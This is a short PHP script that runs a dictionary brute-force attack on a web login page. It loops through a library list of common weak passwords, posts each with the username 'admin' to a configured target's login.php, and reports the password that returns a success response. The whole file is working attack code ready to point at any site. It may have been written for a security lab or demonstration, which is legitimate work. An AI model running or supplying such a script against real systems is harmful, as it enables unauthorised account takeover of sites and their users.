<?php

require_once __DIR__ . '/../../vendor/autoload.php';

$config = require_once __DIR__ . '/../../config/config.php';

$client = new \GuzzleHttp\Client;
$successResponse = json_encode(['success' => true]);

foreach (\Skyzyx\Dictionary\BadPassword\BadPassword::getPasswords() as $password) {
    $response = $client->request(
        'POST',
        $config['target'] . 'login.php',
        [
            'form_params' => [
                'username' => 'admin',
                'password' => $password,
            ]
        ]
    );

    if ($response->getBody() == '{"success":true}') {
        echo 'Password found: ' . $password . PHP_EOL;
        return;
    }

    echo 'Password failed: ' . $password . PHP_EOL;
}
